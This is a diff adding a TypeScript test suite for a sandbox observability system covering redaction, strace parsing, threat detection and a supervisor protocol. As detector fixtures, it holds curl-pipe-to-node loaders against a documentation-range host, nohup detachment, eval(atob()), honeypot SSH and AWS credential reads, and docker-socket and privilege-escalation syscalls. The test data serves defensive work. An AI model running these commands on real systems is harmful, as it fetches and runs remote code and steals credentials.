@@ -1,0 +1,425 @@
+// Tab observability: hostile-input handling, schema, strace parsing, detection, hub state,
+// the collector session, and the supervisor protocol surface. No runtime needed.
+// ADR: docs/adr/20261104-tab-observability.md.
+
+import assert from 'node:assert/strict';
+import type { ChildProcessWithoutNullStreams } from 'node:child_process';
+import { EventEmitter } from 'node:events';
+import * as fs from 'node:fs';
+import * as path from 'node:path';
+import { PassThrough } from 'node:stream';
+import { test } from 'node:test';
+import { encodeJson, FrameDecoder } from '../src/frames.ts';
+import { TabStore } from '../src/state.ts';
+import { Supervisor } from '../src/supervisor.ts';
+import type { Driver, FenceReport, SensorHooks, TabRuntimeSpec, TabTemplate } from '../src/drivers/types.ts';
+import { Detector } from '../src/obs/detect.ts';
+import { ObsHub, listSegments } from '../src/obs/hub.ts';
+import { CollectorSession, LineSplitter } from '../src/obs/sbx-collector.ts';
+import { normalizeDraft, toFalco, type ObsEvent } from '../src/obs/schema.ts';
+import { StraceParser, StraceTracker } from '../src/obs/strace.ts';
+import { redact, redactArgv, safeText } from '../src/obs/text.ts';
+import { mintTabId } from '../src/validate.ts';
+
+const SCRATCH = path.resolve(import.meta.dirname, '../../.work/test-scratch/obs');
+fs.rmSync(SCRATCH, { recursive: true, force: true });
+fs.mkdirSync(SCRATCH, { recursive: true });
+const tick = (ms = 10) => new Promise(r => setTimeout(r, ms));
+
+// ---- text --------------------------------------------------------------------------------
+
+test('obs text: controls, bidi, zero-width and lone surrogates are escaped; output is capped', () => {
+	assert.equal(safeText('a\nb\x1b[31m', 100), 'a\\x0ab\\x1b[31m');
+	assert.equal(safeText('evil\u202Etxt.exe', 100), 'evil\\u202etxt.exe');
+	assert.equal(safeText('x\u200By\uFEFF', 100), 'x\\u200by\\ufeff');
+	assert.equal(safeText('\uD800z', 100), '\\ufffdz');
+	assert.equal(safeText('back\\slash', 100), 'back\\\\slash');
+	assert.equal(Array.from(safeText('é'.repeat(50), 10)).length, 10);
+	assert.ok(safeText('x'.repeat(50), 10).endsWith('…'));
+});
+
+test('obs text: secrets are redacted, sentinels marked, paths survive', () => {
+	// Provider-shaped values are assembled at runtime: no real token prefix in a file (AGENTS.md).
+	const pfx = (a: string, b: string) => a + b;
+	const cases: Array<[string, RegExp]> = [
+		[`token ${pfx('gh', 'p_')}ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789`, /\[redacted:github\]/],
+		[pfx('AK', 'IA') + 'ABCDEFGHIJKLMNOP', /\[redacted:aws\]/],
+		['eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjMifQ.c2lnbmF0dXJlLXRlc3Q', /\[redacted:jwt\]/],
+		['https://user:pa55word@example.test/x', /https:\/\/\[redacted\]@example\.test/],
+		['--password=hunter2', /--password=\[redacted\]/],
+		['Authorization: Bearer abc.def', /Authorization: \[redacted\]/],
+		['SECLAB_SNTL_abcdefghijklmnopqrstuvwxyz0123456789ABCDEFG', /^\[sentinel\]$/],
+		['deadbeef'.repeat(8), /\[redacted:hex\]/],
+		['QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVphYmNkZWZnaGlqa2xtbm9w', /\[redacted:b64\]/],
+	];
+	for (const [input, want] of cases) {
+		assert.match(redact(input).text, want, input);
+	}
+	for (const keep of ['/opt/seclab-reh/node_modules/some-long-package-name/dist/index_compiled_bundle.js', '/home/agent/.ssh/id_rsa', 'curl -s http://192.0.2.10/payload']) {
+		assert.equal(redact(keep).text, keep);
+	}
+	assert.deepEqual(redactArgv(['curl', '--token', 'abc', '-H', 'Authorization: x']).argv, ['curl', '--token', '[redacted]', '-H', 'Authorization: [redacted]']);
+});
+
+// ---- schema -----------------------------------------------------------------------------
+
+test('obs schema: unknown enums and integrity/source mismatches are rejected', () => {
+	const ok = { source: 'falco', integrity: 'host-observed', class: 'process.exec', priority: 'notice', summary: 's' };
+	assert.doesNotThrow(() => normalizeDraft(ok));
+	for (const bad of [
+		{ ...ok, source: 'nope' }, { ...ok, class: 'nope' }, { ...ok, priority: 'loud' },
+		{ ...ok, integrity: 'trusted' }, // a sensor claiming trusted
+		{ ...ok, source: 'sbx-collector', integrity: 'host-observed' },
+		{ ...ok, summary: 1 }, null, [], 'x',
+	]) {
+		assert.throws(() => normalizeDraft(bad), String(JSON.stringify(bad)));
+	}
+});
+
+test('obs schema: fields are picked, capped, escaped and redacted; ref is exact or rejected', () => {
+	const d = normalizeDraft({
+		source: 'sbx-collector', integrity: 'tab-vm-root', class: 'process.exec', priority: 'informational', summary: 'x\u202E',
+		proc: { pid: 5, argv: Array.from({ length: 40 }, (_, i) => `a${i}\n`), lineage: Array.from({ length: 20 }, (_, i) => ({ pid: i, exe: 'sh' })), evil: 1 },
+		detail: Object.fromEntries(Array.from({ length: 30 }, (_, i) => [`k${i}`, 'v'])), extra: 'dropped', seq: 99, tabId: 'forged',
+	}) as unknown as Record<string, unknown>;
+	assert.equal(d.summary, 'x\\u202e');
+	const proc = d.proc as { argv: string[]; lineage: unknown[] };
+	assert.equal(proc.argv.length, 33);
+	assert.equal(proc.argv[0], 'a0\\x0a');
+	assert.equal(proc.lineage.length, 8);
+	assert.equal(Object.keys(d.detail as object).length, 16);
+	assert.equal(d.extra, undefined);
+	assert.equal(d.seq, undefined);
+	assert.equal(d.tabId, undefined);
+	const rpc = { source: 'rpc-filter', integrity: 'trusted', class: 'rpc.decision', priority: 'warning', summary: 'deny' };
+	const ref = `rpc:MainThreadDiaglogs.$showOpenDialog${'x'.repeat(700)}`;
+	assert.equal(normalizeDraft({ ...rpc, detail: { ref } }).detail!.ref, ref); // never truncated
+	assert.throws(() => normalizeDraft({ ...rpc, detail: { ref: 'rpc:a b' } }));
+	assert.throws(() => normalizeDraft({ ...rpc, detail: { ref: `cmd:${'x'.repeat(1100)}` } }));
+	const f = toFalco({ ...normalizeDraft(rpc), v: 1, seq: 1, time: '2026-11-04T00:00:00.000Z', tabId: 't-x' } as ObsEvent);
+	assert.equal(f.priority, 'Warning');
+	assert.deepEqual((f.tags as string[]).slice(0, 2), ['seclab', 'integrity:trusted']);
+});
+
+// ---- strace -----------------------------------------------------------------------------
+
+test('obs strace: real lines parse; unfinished/resumed stitch; lineage waits for the parent', () => {
+	const p = new StraceParser();
+	const t = new StraceTracker();
+	const out: string[] = [];
+	const feed = (l: string) => {
+		const r = p.parse(l);
+		if (r) {
+			for (const d of t.handle(r)) {
+				out.push(`${d.class}|${d.summary}|${(d.proc?.lineage ?? []).map(x => x.exe).join('<')}`);
+			}
+		}
+	};
+	feed('10 1.0 execve("/bin/sh", ["sh", "-c", "curl -s http://192.0.2.10/p | node -e 1"], 0xffff /* 6 vars */) = 0');
+	feed('11 1.1 execve("/usr/bin/curl", ["curl", "-s", "http://192.0.2.10/p"], 0xaaaa /* 6 vars */ <unfinished ...>');
+	feed('10 1.05 clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xffff) = 11');
+	feed('11 1.2 <... execve resumed>) = 0');
+	feed('11 1.3 connect(5, {sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr("192.0.2.10")}, 16) = -1 EINPROGRESS (Operation now in progress)');
+	feed('11 1.3 connect(6, {sa_family=AF_INET6, sin6_port=htons(443), sin6_flowinfo=htonl(0), inet_pton(AF_INET6, "2001:db8::1", &sin6_addr), sin6_scope_id=0}, 28) = 0');
+	feed('11 1.4 connect(7, {sa_family=AF_UNIX, sun_path="/var/run/docker.sock"}, 110) = -1 EACCES (Permission denied)');
+	feed('11 1.5 execve("/nonexistent", ["x"], 0x0) = -1 ENOENT (No such file or directory)');
+	feed('11 1.6 +++ exited with 0 +++');
+	out.push(...t.flush(Infinity).map(d => `${d.class}|${d.summary}|`));
+	assert.deepEqual(out, [
+		'process.exec|exec curl -s http://192.0.2.10/p|sh -c "curl -s http://192.0.2.10/p | node -e 1"',
+		'net.connect|connect 192.0.2.10:80 pending by curl|sh -c "curl -s http://192.0.2.10/p | node -e 1"',
+		'net.connect|connect 2001:db8::1:443 ok by curl|sh -c "curl -s http://192.0.2.10/p | node -e 1"',
+		'net.connect|connect /var/run/docker.sock EACCES by curl|sh -c "curl -s http://192.0.2.10/p | node -e 1"',
+		'process.exit|exit curl code 0|sh -c "curl -s http://192.0.2.10/p | node -e 1"',
+		'process.exec|exec sh -c "curl -s http://192.0.2.10/p | node -e 1"|',
+	]);
+});
+
+test('obs strace: hostile strings stay inside their quotes; escapes decode; malformed input throws', () => {
+	const p = new StraceParser();
+	const t = new StraceTracker();
+	t.seed(5, { ppid: 1 });
+	// The tab controls argv: strace escapes quotes and newlines, so a fake "= 0" or line break can't split the record.
+	const r = p.parse('5 2.0 execve("/x", ["a\\") = 0\\n6 2.0 execve(\\"/fake", "\\303\\251\\342\\200\\256", "\\x41"], 0x0) = 0');
+	assert.ok(r && r.kind === 'syscall');
+	const d = t.handle(r!)[0];
+	assert.deepEqual(d.proc!.argv, ['a") = 0\n6 2.0 execve("/fake', 'é\u202E', 'A']);
+	for (const bad of [
+		'x', '5 2.0 ', '5 2.0 execve("a', '5 2.0 execve("a\u0001") = 0', '5 2.0 execve("\\q") = 0',
+		`5 2.0 f(${'['.repeat(20)}`, '5 2.0 execve("/x") trailing', `5 2.0 f(${'1,'.repeat(5000)}1) = 0`,
+		`5 2.0 f("${'a'.repeat(70 * 1024)}") = 0`,
+	]) {
+		assert.throws(() => p.parse(bad), bad.slice(0, 40));
+	}
+});
+
+test('obs strace: tampering, privilege and sensitive calls are classified', () => {
+	const p = new StraceParser();
+	const t = new StraceTracker({ collectorPids: () => new Set([400]) });
+	const one = (l: string) => t.handle(p.parse(l)!)[0];
+	assert.equal(one('9 1.0 kill(400, SIGKILL) = -1 EPERM (Operation not permitted)').priority, 'critical');
+	assert.equal(one('9 1.0 kill(1, SIGTERM) = 0').detail!.tamper, true);
+	assert.equal(one('1 1.0 kill(-1, SIGTERM) = 0').detail!.tamper, false); // init shutting down
+	assert.equal(one('9 1.0 ptrace(PTRACE_SEIZE, 400, NULL, 0) = -1 EPERM (Operation not permitted)').priority, 'critical');
+	assert.equal(one('9 1.0 setresuid(0, 0, 0) = 0').priority, 'critical');
+	assert.equal(one('9 1.0 unshare(CLONE_NEWUSER|CLONE_NEWNS) = 0').class, 'proc.sensitive');
+	assert.equal(one('9 1.0 fchmodat(AT_FDCWD, "/w/run.sh", 0755) = 0').detail!.executable, true);
+	assert.equal(one('9 1.0 renameat2(AT_FDCWD, "a", AT_FDCWD, "/w/.git/hooks/pre-commit", 0) = 0').file!.path, '/w/.git/hooks/pre-commit');
+});
+
+// ---- detection --------------------------------------------------------------------------
+
+function ev(over: Partial<ObsEvent>): ObsEvent {
+	return { v: 1, seq: 7, time: new Date().toISOString(), tabId: 't-x', source: 'sbx-collector', integrity: 'tab-vm-root', class: 'process.exec', priority: 'informational', summary: '', ...over } as ObsEvent;
+}
+
+test('obs detect: the Contagious-Interview shapes fire with the weakest integrity', () => {
+	const det = new Detector();
+	const ctx = { openedAt: Date.now() - 5000, workspace: '/w' };
+	const rules = (e: ObsEvent) => det.check(e, ctx).map(d => `${d.rule}:${d.priority}:${d.integrity}`);
+	const extHost = [{ pid: 3, exe: 'sh -c x' }, { pid: 2, exe: '/opt/seclab-reh/node out/bootstrap-fork --type=extensionHost' }];
+	assert.deepEqual(rules(ev({ proc: { pid: 4, exe: '/bin/sh', argv: ['sh', '-c', 'nohup sh -c "curl -s http://192.0.2.10/p | node" &'], lineage: extHost } })), ['loader.pipe-to-interpreter:critical:tab-vm-root']);
+	assert.deepEqual(rules(ev({ proc: { pid: 5, exe: '/usr/bin/curl', argv: ['curl', 'http://192.0.2.10/p'], lineage: extHost } })), ['task.network-tool:critical:tab-vm-root']);
+	assert.deepEqual(rules(ev({ proc: { pid: 6, exe: '/usr/bin/nohup', argv: ['nohup', 'sh'], lineage: extHost } })), ['process.detach:critical:tab-vm-root']);
+	assert.deepEqual(rules(ev({ proc: { pid: 7, exe: '/usr/bin/node', argv: ['node', '-e', 'eval(atob("eA=="))'] } })), ['loader.eval:warning:tab-vm-root']);
+	assert.deepEqual(rules(ev({ class: 'honeypot.access', file: { path: '/home/agent/.ssh/id_rsa' }, detail: { kind: 'read' } })), ['credential.honeypot-read:critical:tab-vm-root']);
+	assert.deepEqual(rules(ev({ source: 'workspace-watch', integrity: 'trusted', class: 'workspace.change', file: { path: '/w/.vscode/tasks.json' }, detail: { change: 'modified' } })), ['workspace.host-executable-write:critical:trusted']);
+	assert.deepEqual(rules(ev({ class: 'net.connect', net: { addr: '192.0.2.10', port: 80, family: 'inet', result: 'pending' } })), ['egress.bypass:warning:tab-vm-root']);
+	assert.deepEqual(rules(ev({ class: 'net.connect', net: { addr: '127.0.0.1', port: 9, family: 'inet' } })), []);
+	assert.deepEqual(rules(ev({ class: 'net.connect', net: { addr: '/var/run/docker.sock', family: 'unix', result: 'EACCES' } })), ['escape.container-socket:critical:tab-vm-root']);
+	assert.deepEqual(rules(ev({ class: 'detection' })), []);
+	assert.deepEqual(new Detector().check(ev({ source: 'falco', integrity: 'host-observed', proc: { pid: 1, argv: ['wget', 'x'] } }), {}).map(d => d.integrity), ['host-observed']);
+});
+
+test('obs detect: a regular beacon is reported once; jitter is not a beacon', () => {
+	const det = new Detector();
+	const at = (s: number, addr = '192.0.2.10') => det.check(ev({ class: 'net.connect', time: new Date(1_800_000_000_000 + s * 1000).toISOString(), net: { addr, port: 443, family: 'inet' } }), {}).filter(d => d.rule === 'beacon.periodic');
+	assert.equal([0, 5, 10, 15].flatMap(s => at(s)).length, 1);
+	assert.equal([20, 25].flatMap(s => at(s)).length, 0); // once per 10 min
+	assert.equal([0, 1, 9, 30, 31].flatMap(s => at(s, '192.0.2.11')).length, 0);
+});
+
+// ---- hub --------------------------------------------------------------------------------
+
+test('obs hub: contiguous seq, rate limit summarised, heartbeat gap -> unobserved, expected end -> unavailable', () => {
+	let now = 1_800_000_000_000;
+	const seen: ObsEvent[] = [];
+	const obs: string[] = [];
+	const hub = new ObsHub({ now: () => now, onEvent: e => seen.push(e), onObservation: (_t, o) => obs.push(o.state), sensorRate: { rate: 10, burst: 20 } });
+	const tab = mintTabId();
+	hub.setObservation(tab, 'observed', 'collector started', { sensor: 'sbx-collector' });
+	for (let i = 0; i < 50; i++) {
+		hub.emit(tab, { source: 'sbx-collector', integrity: 'tab-vm-root', class: 'process.exit', priority: 'debug', summary: `e${i}` });
+	}
+	assert.equal(hub.emit(tab, { source: 'nope' }), undefined);
+	now += 500;
+	hub.tickNow();
+	const sums = seen.filter(e => e.class === 'sensor.status').map(e => e.summary);
+	assert.ok(sums.includes('30 sensor events dropped (rate limit)'), JSON.stringify(sums));
+	assert.ok(sums.includes('1 malformed events rejected'));
+	assert.deepEqual(seen.map(e => e.seq), seen.map((_, i) => i + 1));
+	assert.deepEqual(obs, ['observed', 'degraded']);
+	now += 7000;
+	hub.tickNow();
+	assert.equal(hub.observation(tab).state, 'unobserved');
+	assert.match(hub.observation(tab).reason, /no heartbeat/);
+	hub.heartbeat(tab);
+	assert.equal(hub.observation(tab).state, 'observed');
+	hub.sensorEnded(tab, 'collector exited (137)', true);
+	assert.equal(hub.observation(tab).state, 'unobserved');
+	hub.expectEnd(tab);
+	hub.sensorEnded(tab, 'eof', true);
+	assert.equal(hub.observation(tab).state, 'unavailable');
+	hub.close();
+});
+
+test('obs hub: JSONL log persists, continues its sequence after restart, files are private', () => {
+	const dir = path.join(SCRATCH, 'events');
+	const tab = mintTabId();
+	const a = new ObsHub({ dir });
+	for (let i = 0; i < 5; i++) {
+		a.trusted(tab, { class: 'tab.lifecycle', priority: 'notice', summary: `n${i}` });
+	}
+	a.close();
+	const b = new ObsHub({ dir });
+	assert.equal(b.trusted(tab, { class: 'tab.lifecycle', priority: 'notice', summary: 'after restart' })!.seq, 6);
+	b.close();
+	const segs = listSegments(path.join(dir, tab));
+	const file = path.join(dir, tab, `events-${String(segs[0]).padStart(6, '0')}.jsonl`);
+	const lines = fs.readFileSync(file, 'utf8').trim().split('\n').map(l => JSON.parse(l));
+	assert.deepEqual(lines.map(l => l.seq), [1, 2, 3, 4, 5, 6]);
+	assert.equal(fs.statSync(file).mode & 0o777, 0o600);
+	assert.throws(() => new ObsHub({ dir }).trusted('../../etc', { class: 'tab.lifecycle', priority: 'notice', summary: 'x' }));
+});
+
+// ---- collector session ------------------------------------------------------------------
+
+function fakeChild() {
+	const child = new EventEmitter() as unknown as ChildProcessWithoutNullStreams;
+	const stdin = new PassThrough(), stdout = new PassThrough(), stderr = new PassThrough();
+	Object.assign(child, { stdin, stdout, stderr, kill: () => true });
+	return { child, stdin, stdout, end: (code = 0) => (child as unknown as EventEmitter).emit('close', code) };
+}
+
+test('obs collector: records become events; seq gaps, oversize and junk are counted; REH gates start', async () => {
+	const tab = mintTabId();
+	const seen: ObsEvent[] = [];
+	const hub = new ObsHub({ onEvent: e => seen.push(e) });
+	const f = fakeChild();
+	const s = new CollectorSession(tab, f.child, hub, { mode: 'default', isRunning: async () => true });
+	const cfg: string[] = [];
+	f.stdin.on('data', d => cfg.push(String(d)));
+	s.configure('a'.repeat(64));
+	const w = (o: object) => f.stdout.write(`${JSON.stringify(o)}\n`);
+	w({ k: 'hello', n: 1, pid: 400, kernel: '7.0.14', strace: 'strace 6.13', brokerAddrs: ['192.0.2.1', 'not an ip'] });
+	w({ k: 'hb', n: 2, pids: [400, 401] });
+	w({ k: 's', n: 3, l: '9 1.0 kill(401, SIGKILL) = -1 EPERM (Operation not permitted)' });
+	w({ k: 'hp', n: 4, path: '/home/agent/.aws/credentials', kind: 'read' });
+	w({ k: 'reh', n: 5, id: 0, code: 0 });
+	w({ k: 'hb', n: 9 }); // gap
+	f.stdout.write(`${'x'.repeat(200 * 1024)}\n`);
+	f.stdout.write('not json\n');
+	w({ k: 'untraced', n: 10, pid: 77, tracer: 66, exe: '/usr/bin/sh' });
+	await s.rehReady;
+	await tick(20);
+	hub.tickNow();
+	assert.deepEqual(JSON.parse(cfg[0]), { v: 1, mode: 'default', token: 'a'.repeat(64), user: 'agent', relayUser: 'seclab-relay' });
+	const by = (c: string) => seen.filter(e => e.class === c);
+	assert.equal(by('proc.signal')[0].priority, 'critical'); // targets a collector pid
+	assert.equal(by('honeypot.access')[0].integrity, 'tab-vm-root');
+	assert.ok(by('detection').some(e => e.rule === 'credential.honeypot-read'));
+	assert.ok(by('detection').some(e => e.rule === 'sensor.tamper'));
+	const status = by('sensor.status').map(e => e.summary);
+	assert.ok(status.some(x => /sequence gap: expected 6, got 9/.test(x)), JSON.stringify(status));
+	assert.ok(status.some(x => /traced by another process/.test(x)));
+	assert.ok(status.some(x => x === '2 malformed events rejected'));
+	assert.equal(hub.observation(tab).state, 'degraded');
+	f.end(137);
+	await tick(20);
+	assert.equal(hub.observation(tab).state, 'unobserved');
+	hub.close();
+});
+
+test('obs collector: a fatal collector error rejects the REH start', async () => {
+	const hub = new ObsHub();
+	const f = fakeChild();
+	const s = new CollectorSession(mintTabId(), f.child, hub, { mode: 'deep', isRunning: async () => true });
+	f.stdout.write(`${JSON.stringify({ k: 'err', n: 1, fatal: true, msg: 'missing /usr/bin/strace (rebuild the template)' })}\n`);
+	await assert.rejects(s.rehReady, /missing \/usr\/bin\/strace/);
+	hub.close();
+});
+
+test('obs line splitter: lines over the cap are dropped whole, across chunks', () => {
+	const sp = new LineSplitter(8);
+	const got: string[] = [];
+	let over = 0;
+	for (const c of ['abc\n0123', '45678', '9\nxy', 'z\n']) {
+		sp.push(Buffer.from(c), l => got.push(String(l)), () => over++);
+	}
+	assert.deepEqual(got, ['abc', 'xyz']);
+	assert.equal(over, 1);
+});
+
+// ---- supervisor protocol ----------------------------------------------------------------
+
+class CollectorDriver implements Driver {
+	readonly name = 'fake';
+	running = new Set<string>();
+	collectors: Array<ReturnType<typeof fakeChild>> = [];
+	async probe() {
+		return { name: 'fake', available: true, capabilities: { isolationClass: 'microvm', networkFence: 'none', liveMounts: false, holdAndResume: false, fileWatch: 'native', sameAbsolutePathMount: true } as const };
+	}
+	async ensureRunning(spec: TabRuntimeSpec, token: string, sensor?: SensorHooks) {
+		this.running.add(spec.sandboxName);
+		await sensor!.startCollector!(() => {
+			const f = fakeChild();
+			this.collectors.push(f);
+			f.stdin.on('data', (d: Buffer) => {
+				for (const line of String(d).split('\n').filter(Boolean)) {
+					const m = JSON.parse(line);
+					const n = () => ++seq;
+					if (m.v === 1) {
+						f.stdout.write([{ k: 'hello', pid: 400 }, { k: 'hb' }, { k: 'reh', id: 0, code: 0 }].map(o => JSON.stringify({ ...o, n: n() })).join('\n') + '\n');
+					} else if (m.cmd === 'ensure-reh') {
+						f.stdout.write(`${JSON.stringify({ k: 'reh', id: m.id, code: 0, n: n() })}\n`);
+					}
+				}
+			});
+			let seq = 0;
+			return f.child;
+		}, token);
+	}
+	async verifyFence(): Promise<FenceReport> { return { ok: true, problems: [], checkedAt: '' }; }
+	async quarantine() { }
+	async runningSandboxes() { return new Set(this.running); }
+	connectReh(): ChildProcessWithoutNullStreams { throw new Error('unused'); }
+	async stop(spec: TabRuntimeSpec) { this.running.delete(spec.sandboxName); }
+	async remove() { }
+}
+
+test('obs supervisor: collector gates the REH, is reused, events stream to subscribers; reports are restricted', async () => {
+	const dir = path.join(SCRATCH, 'sup');
+	fs.rmSync(dir, { recursive: true, force: true });
+	const ws = path.join(dir, 'home', 'src', 'proj');
+	fs.mkdirSync(ws, { recursive: true });
+	const driver = new CollectorDriver();
+	const template: TabTemplate = { kind: 'TabTemplate', metadata: { name: 'default' }, spec: { driver: 'fake', image: 'img', envVarsInjectionPolicy: 'Disallowed', fence: 'required', broker: 'none' } };
+	const out: Array<{ channel: number; payload: Buffer }> = [];
+	const dec = new FrameDecoder();
+	const sup = new Supervisor({
+		drivers: new Map([['fake', driver]]), templates: new Map([['default', template]]), store: new TabStore(path.join(dir, 'state')),
+		write: b => out.push(...dec.push(b)), onFatal: () => undefined, fenceReverifyMs: 60_000,
+		pathPolicy: { home: path.join(dir, 'home'), allowedRoots: [path.join(dir, 'home', 'src')] },
+		scan: async () => ({ complete: true, findings: [], secrets: new Map() }), eventsDir: path.join(dir, 'state', 'events'),
+	});
+	const msgs = () => out.filter(f => f.channel === 0).map(f => JSON.parse(f.payload.toString()));
+	let id = 1;
+	const call = async (method: string, params: unknown = {}) => {
+		const myId = id++;
+		sup.receive(encodeJson({ jsonrpc: '2.0', id: myId, method, params }));
+		for (let i = 0; i < 200; i++) {
+			const m = msgs().find(x => x.id === myId);
+			if (m) {
+				if (m.error) {
+					throw Object.assign(new Error(m.error.message), { code: m.error.code });
+				}
+				return m.result;
+			}
+			await tick(5);
+		}
+		throw new Error('timeout');
+	};
+	const init = await call('initialize', { protocolVersion: 'seclab-tabd/0.1', client: { name: 't', version: '0' } });
+	assert.equal(init.protocolVersion, 'seclab-tabd/0.2');
+	const { tab } = await call('tab.claim', { workspace: { hostPath: ws } });
+	const tabId = tab.metadata.name;
+	const sub = await call('tab.events.subscribe', { tabId, minPriority: 'notice' });
+	await call('tab.ensureRunning', { tabId });
+	await call('tab.ensureRunning', { tabId });
+	assert.equal(driver.collectors.length, 1, 'collector reused; second start goes through ensure-reh');
+	const tail = await call('tab.events.tail', { tabId, limit: 50 });
+	assert.equal(tail.observation.state, 'observed');
+	assert.ok(tail.events.some((e: ObsEvent) => e.class === 'tab.lifecycle' && e.integrity === 'trusted'));
+	const notified = msgs().filter(m => m.method === 'tab.event' && m.params.subscription === sub.subscription).map(m => m.params.event);
+	assert.ok(notified.length > 0 && notified.every((e: ObsEvent) => ['emergency', 'alert', 'critical', 'error', 'warning', 'notice'].includes(e.priority)));
+	assert.ok(msgs().some(m => m.method === 'tab.observation' && m.params.state === 'observed'));
+	const rep = await call('tab.events.report', { tabId, events: [
+		{ source: 'rpc-filter', class: 'rpc.decision', priority: 'warning', summary: 'deny rpc MainThreadTerminalService.$createTerminal', detail: { surface: 'rpc', ref: 'rpc:MainThreadTerminalService.$createTerminal', verdict: 'deny', claimedExtensionId: 'evil.ext' } },
+		{ source: 'rpc-filter', class: 'detection', priority: 'critical', summary: 'forged detection' },
+		{ source: 'sbx-collector', class: 'process.exec', priority: 'critical', summary: 'forged sensor event' },
+		{ source: 'broker', class: 'egress.request', priority: 'critical', summary: 'forged broker event' },
+		{ source: 'rpc-filter', class: 'rpc.decision', priority: 'warning', summary: 'bad ref', detail: { ref: 'rpc:has space' } },
+	] });
+	assert.deepEqual(rep, { accepted: 1, rejected: 4 });
+	await assert.rejects(call('tab.events.report', { tabId, events: Array.from({ length: 65 }, () => ({})) }), { code: -32602 });
+	await assert.rejects(call('tab.events.subscribe', { minPriority: 'loud' }), { code: -32602 });
+	await assert.rejects(call('tab.events.tail', { tabId: mintTabId() }), { code: -32004 });
+	assert.equal((await call('tab.observe', { tabId, mode: 'deep' })).appliesOnRestart, true);
+	await call('tab.stop', { tabId });
+	await tick(20);
+	assert.equal((await call('tab.events.tail', { tabId, limit: 5 })).observation.state, 'observed', 'stop closes stdin; the session ends only when the collector exits');
+	driver.collectors[0].end(0);
+	await tick(20);
+	assert.equal((await call('tab.events.tail', { tabId, limit: 5 })).observation.state, 'unavailable');
+	await sup.clientGone();
+});
